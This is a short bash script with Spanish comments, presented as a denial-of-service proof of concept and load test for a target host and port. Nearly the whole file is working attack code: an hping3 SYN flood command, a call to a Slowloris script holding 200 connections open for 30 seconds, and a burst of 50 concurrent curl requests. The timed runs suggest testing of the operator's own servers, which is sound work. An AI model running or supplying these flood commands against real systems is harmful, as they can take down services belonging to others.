#!/bin/bash
# test_ddos.sh
# Scripts de prueba de denegación de servicio (POC). Ejecutar desde una máquina separada.
# Requiere: hping3, curl, o python3 para slowloris.

set -euo pipefail

if [ "$#" -lt 2 ]; then
  echo "Usage: $0 <target_host> <target_port>"
  exit 1
fi

TARGET=$1
PORT=$2

echo "=== Pruebas de carga / ataque controlado ==="
echo "1) Simple HTTP flood con hping3 (si instalado)"
if command -v hping3 >/dev/null 2>&1; then
  echo "Ejecutando hping3 SYN flood (5s) hacia $TARGET:$PORT"
  sudo hping3 -S -p $PORT -i u1000 --flood $TARGET & pid_hping=$!
  sleep 5
  kill $pid_hping || true
  echo "hping3 finalizado"
else
  echo "hping3 no instalado, saltando test 1"
fi

echo "2) Slowloris PoC (python script)"
if command -v python3 >/dev/null 2>&1; then
  echo "Iniciando slowloris durante 30s"
  python3 infra/ddos/slowloris.py $TARGET $PORT 200 & pid_slow=$!
  sleep 30
  kill $pid_slow || true
  echo "Slowloris finalizado"
else
  echo "python3 no disponible, saltando slowloris"
fi

echo "3) Peticiones concurrentes con curl (simula carga ligera)"
for i in {1..50}; do
  curl -s "http://$TARGET:$PORT/" >/dev/null &
done
wait

echo "Pruebas completadas. Revisa métricas y logs en el servidor objetivo para ver el impacto."
